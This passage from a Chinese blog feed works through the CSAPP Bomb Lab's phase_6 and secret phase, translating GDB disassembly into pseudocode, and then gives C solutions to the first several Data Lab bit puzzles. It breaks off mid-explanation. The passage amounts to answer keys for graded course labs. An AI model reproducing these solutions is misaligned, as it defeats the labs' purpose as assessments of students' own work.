&lt;+264&gt;:   pop    %rbp0x00000000004011fd &lt;+265&gt;:   pop    %r120x00000000004011ff &lt;+267&gt;:   pop    %r130x0000000000401201 &lt;+269&gt;:   pop    %r140x0000000000401203 &lt;+271&gt;:   ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 遍历链表，判断是否从大到小排序，若不是，则引爆Mem[%rdx + 8] &#x3D; 0;for (%ebp &#x3D; 5; %ebp !&#x3D; 0; --%ebp) &#123;%rax &#x3D; Mem[%rbx + 8];    %eax &#x3D; Mem[%rax];    if (Mem[%rbx] &lt; %eax) &#123;        explode_bomb();    &#125;   %rbx &#x3D; Mem[%rbx + 8];&#125;</code></pre><p>终于到最后一部分了，这一部分的作用很明显：判断链表是否有序，更准确地说，是否以非递增顺序排列。</p><p>那么本关的目标终于浮出水面了：</p><p><em>输入六个数字，对于每个数字 num，将 7 - num 作为索引，根据链表 node 重构出一个新的链表，并保证重构的链表按非递增顺序排列。</em></p><p>注意链表值域的比较只关注低 4 字节，因此链表各结点值域从大到小排序为：<code>3 4 5 6 1 2</code>，那么对应的输入数字为：<code>4 3 2 1 6 5</code>，即本关的正确答案。</p><h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>解决隐藏关卡首先要解决的问题是：如何进入？观察 main 函数的汇编代码，在结束 phase_6 之后、main 函数返回之前，只有 phase_defused 函数被调用，看来入口可能隐藏在一直以来被忽略的部分。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-4.png" alt></p><p>对 phase_defused 进行反汇编，结果如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r80x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp0x0000000000401658 &lt;+148&gt;:   ret</code></pre><p>和之前的做法一样，将汇编代码翻译为 C 语言风格的伪代码，同时打印程序中用到的一些字符串：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp.png" alt></p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rax &#x3D; Mem[%fs + 0x28];Mem[%rsp + 0x68] &#x3D; %rax;if (Mem[%rip + 0x202181] &#x3D;&#x3D; 6) &#123; &#x2F;&#x2F; num_input_strings%r8 &#x3D; %rsp + 0x10;%rcx &#x3D; %rsp + 0xc;%rdx &#x3D; %rsp + 0x8;%rdi &#x3D; 0x603870;sscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);if (%eax &#x3D;&#x3D; 3) &#123;%rdi &#x3D; %rsp + 0x10;if (strings_not_equal(%rdi, &quot;DrEvil&quot;) &#x3D;&#x3D; 0) &#123;puts(&quot;Curses, you&#39;ve found the secret phase!&quot;);puts(&quot;But finding it and solving it are quite different...&quot;);%eax &#x3D; 0;secret_phase();&#125;&#125;puts(&quot;Congratulations! You&#39;ve defused the bomb!&quot;);&#125;%rax &#x3D; Mem[%rsp + 0x68];if (%rax !&#x3D; Mem[%fs + 0x28]) &#123;__stack_chk_fail();&#125;</code></pre><p>仔细分析上述代码的逻辑，当输入的字符串个数等于 6 时，即解决了 phase_1 ~ phase_6 所有关卡后，程序调用 <code>sscanf</code> 从地址 <code>0x603870</code> 处读取以空格分隔的两个整数和一个字符串，分别存入寄存器 <code>%rdx</code>、<code>%rcx</code> 和 <code>%r8</code> 中，当函数返回值为 3，即成功匹配了 3 个值，且匹配到的第三个值（字符串）等于 \”DrEvil\” 时，即可进入隐藏关卡。</p><p>但是上面我们已经打印了地址 <code>0x603870</code> 处的字符串，为 <code>3 0</code>，只有两个，无法使得匹配数为 3. 我最开始想到的解决方法就是在调试过程中手动更改该地址处的值，但是这样的做法也只具备调试作用，进入隐藏关卡密码仍然无法得到。</p><p>换个角度来思考，这个 <code>3 0</code> 有没有可能不是硬编码的数据，而是我们手动输入的？记得之前 <code>phase_4</code> 的正确密码之一就是 <code>3 0</code>。</p><p>将断点设置在 phase_4 处，并打印 <code>%rdi</code> 寄存器的值， 发现正好就是 <code>0x603870</code>，因此 phase_4 的完整密码应该是 <code>3 0 DrEvil</code> （正如前面所说，前两位也可以是 <code>1 0</code>、<code>7 0</code> 等）。</p><blockquote><p>注意末尾的 DrEvil 在 phase_4 中并不会被读取，因为模式字符串为 “%d %d”，因此匹配成功的值最多为 2，不会影响 <code>cmp  $0x2, %eax</code> 的判断。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-2.png" alt></p><p>经过前面的准备，终于可以着手解决隐藏关卡了，相信有了前面这些关卡的锻炼，隐藏关卡不会显得太难。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;0x0000000000401291 &lt;+79&gt;:    pop    %rbx0x0000000000401292 &lt;+80&gt;:    ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_line();strtol(%rax, 0, 0xa);%rbx &#x3D; %rax;%eax &#x3D; %rax - 1;if (%eax &gt; 0x3e8) &#123;  &#x2F;&#x2F; 无符号比较explode_bomb();&#125;fun7(0x6030f0, %ebx);if (%eax !&#x3D; 2) &#123;explode_bomb();&#125;puts(0x402438);phase_defused();</code></pre><p>可以看到，隐藏关卡的代码逻辑还是比较清晰的：读取一行，应该是隐藏关卡的密码，将其转换为 <code>long</code> 类型，然后又是和之前类似的范围限定语句，随后调用函数 <code>fun7</code>，如果返回值为 2，则密码输入正确。</p><p>问题的关键还是在于函数 <code>fun7</code>，其代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;0x000000000040121c &lt;+24&gt;:    add    %eax,%eax0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp0x0000000000401241 &lt;+61&gt;:    ret</code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>又是一个递归函数，不过和 phase_4 不同，这个函数的代码显得很有规律，看到 <code>*(x + 8)</code> 和 <code>*(x + 16)</code> 这样的表达式很容易想到可能又是某种链接结构，不妨打印 <code>0x6030f0</code> 处的内容：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-3.png" alt></p><p>这下结果很明确了，每个结点包含两个链接（指针）域，没错，正是二叉树。为了分析的方便，我根据上图的数据内容绘制了一个等价的二叉树，如下图所示：</p><blockquote><p>可以看到，每个结点由 4 个 8 字节组成，前三个应该分别是值域、左孩子、右孩子，最后一个全为 0 的 8 字节貌似很多余，个人推测应该是 C 语言结构体的 <strong>字节对齐</strong> 导致的。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/btree.png" alt></p><p>最后再回到函数 fun7 中，要使得最终结果等于 2，一种可能的计算方法如下：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/formu.png" alt></p><p>我们只需要保证二叉树遍历时依次遍历左孩子、右孩子、左孩子，且输入密码正好等于叶子结点即可，<code>0x14</code> 正好就满足条件，因此隐藏关卡的密码为 20.</p><p>至此，”炸弹“ 成功被”拆除“。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;p&gt;本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏</summary>
      
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/</id>
    <published>2024-08-31T03:45:11.000Z</published>
    <updated>2024-09-01T07:30:08.529Z</updated>
    
    <content type="html"><![CDATA[<p>CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。<br><span id="more"></span></p><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用德-摩根定律进行推导，推导过程如下：</p><p><img src="/2024/08/31/CSAPP-Data-Lab/formu.png" alt></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 德-摩根定律</span>    <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>最小整数即最高位（负数权重）为 1，其余（正数权重）为 0。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>由于不能使用左移运算符，因此没办法直接构造出 tmax，需要仔细考虑 tmax 的性质：<code>tmax = 0x7fffffff</code> ，而 <code>tmax + 1 = 0x80000000</code> ，这两个数的二进制位完全互补，因此满足：<code>tmax + tmax + 1 = 0xffffffff</code>，结果全为 1，对该结果取反即可得到 0，取非得到 1。</p><p>但这里还要考虑一个特殊情况：当 <code>x = 0xffffffff</code> 时，<code>x + 1 + x</code> 也满足等于 <code>0xffffffff</code>，因此需要借助异或运算进行特判。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// case = x == 0xffffffff ? 1 : 0;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>case1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>首先构造一个掩码 mask，奇数位全为 1，偶数位全为 0。将 mask 与 x 进行按位与，如果 x 的奇数位全为 1，那么按位与的结果仍然为 mask。然后便可以借助异或和非的组合，将结果转换为 0 或 1。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>            <span class="token comment">// mask = 0x000000aa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x0000aaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x00aaaaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0xaaaaaaaa</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>补码表示法的重要特性，取反加一即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>这里我用了比较笨的逐位判断的方法。首先判断第 4 到第 31 位是否为 0x3，然后只需要关注低 4 位的二进制表示了：若第 3 位为 0，则一定位于指定范围之内，再加上两个特例（1000 和 1001）即可。</p><p>最后将运算符的个数刚好卡在 15 个，勉强过关。</p><h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0011 0000 &lt;= x &lt;= 0011 1001</span>    <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 4 ~ 31 位是否为 0x3</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// bit3 = 0</span>    <span class="token keyword">int</span> case2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1000</span>    <span class="token keyword">int</span> case3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1001</span>    <span class="token keyword">return</span> high <span class="token operator">&amp;</span> <span class="token punctuation">(</span>case1 <span class="token operator">|</span> case2 <span class="token operator">|</span> case3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>很容易想到根据 x 的值是否非 0 构造出全 0 或者全 1 的数据 flag，然后将 flag 和 flag 取反后的值分别与 y 和 z 进行按位与，这样必然得到两个数：一个为 y 或 z 本身，另一个为 0，再将结果按位或即可。</p><p>构造的方法比较巧妙，需要注意到全 0 和全 1 分别代表整数 0 和 -1，它们分别是 0 和 1 的相反数，而 0 和 1 我们可以根据表达式是否非 0，使用非运算符构造出来，再将构造的结果取反加一即可。</p><h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment">// flag = x ? 0 : -1;</span>    <span class="token keyword">int</span> yp <span class="token operator">=</span> <span class="token operator">~</span>flag <span class="token operator">&amp;</span> y<span class="token punctuation">;</span>       <span class="token comment">// flag = 0, yp = y; flag = -1, yp = 0;</span>    <span class="token keyword">int</span> zp <span class="token operator">=</span> flag <span class="token operator">&amp;</span> z<span class="token punctuation">;</span>        <span class="token comment">// flag = 0, zp = 0; flag = -1, zp = z;</span>    <span class="token keyword">return</span> yp <span class="token operator">|</span> zp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>判断两个数的大小关系，很容易想到使用作差的方法，判断 <code>x + ~y + 1</code> 的结果是否小于等于 0，即全为 0 或者最高位为 1。</p><p>不过这里还需要考虑溢出：由于同号相减必定不会导致溢出，因此我们只需要考虑异号的情况。而如果两个数异号，那它们之间的大小关系就显而易见了。</p><h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sign1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign1 = (x &lt; 0 &amp;&amp; y > 0) ? 1 : 0;</span>    <span class="token keyword">int</span> sign2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign2 = (x > 0 &amp;&amp; y &lt; 0) ? 1 : 0;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token operator">~</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                             <span class="token comment">// z = x - y</span>    <span class="token keyword">int</span> sub <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// z &lt;= 0    </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>sub <span class="token operator">|</span> sign1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>sign2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>这题从二进制位的角度不好思考，不妨从其表示的十进制数的角度出发：</p><p>当 x = 0 时，<code>-x = x</code> ，即 x 和 -x 的最高位相同，都为 0；当 x != 0 时，x 和 -x 的最高位必定有一个为 1。</p><p>可以利用这一特性将 <code>x | nx</code> 右移 31 位，由于整数进行的是符号右移，因此当最高位为 0 时，右移的结果全为 0，当最高位为 1 时，右移的结果全为 1。再将右移结果加 1，即可构造出 1 或者 